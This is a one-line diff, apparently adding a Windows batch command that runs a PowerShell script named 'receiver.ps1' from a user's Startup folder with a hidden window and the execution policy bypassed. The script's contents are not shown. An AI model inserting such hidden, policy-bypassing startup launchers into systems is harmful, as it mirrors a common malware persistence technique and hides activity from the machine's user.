@@ -1,0 +1,1 @@
+start /min "" powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "C:\Users\vikto\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\receiver.ps1"
